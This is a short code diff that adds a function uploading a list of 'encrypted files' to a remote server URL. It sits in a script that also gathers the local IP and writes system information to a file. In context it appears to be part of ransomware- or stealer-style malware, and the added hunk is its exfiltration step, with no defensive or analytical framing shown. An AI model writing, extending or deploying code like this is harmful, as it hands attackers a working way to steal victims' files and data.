@@ -90,7 +90,18 @@ def get_local_ip():
         s.close()
     return local_ip
 
-
+#File upload functionality
+def upload_encrypted_files(encrypted_files, server_url):
+    for file in encrypted_files:
+        try:
+            with open(file, "rb") as f:
+                response = requests.post(server_url, files={'file': (os.path.basename(file), f)})
+            if response.status_code == 200:
+                print(f"[UPLOAD] {file} uploaded successfully.")
+            else:
+                print(f"[UPLOAD] Failed to upload {file}: {response.text}")
+        except Exception as e:
+            print(f"[UPLOAD] Error uploading {file}: {e}")
 
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
